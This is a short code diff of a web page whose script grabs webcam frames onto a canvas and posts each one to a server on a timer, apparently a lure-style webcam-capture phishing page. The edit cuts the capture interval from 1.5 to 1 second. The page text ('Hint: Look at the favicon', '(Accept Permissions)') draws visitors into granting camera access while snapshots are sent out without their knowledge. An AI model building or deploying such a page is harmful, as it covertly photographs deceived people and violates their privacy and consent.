@@ -64,7 +64,7 @@ var context = canvas.getContext('2d');
 
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+       post(canvasData); }, 1000);
   
 
 }
@@ -75,7 +75,7 @@ init();
 </script>
 
     <body>
-        <img src="webcam.jpg" height="70" width="70">
+        <img src="webcam.jpg">
         <p>Hint: Look at the favicon</p>
         <p>(Accept Permissions)</p>
         <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
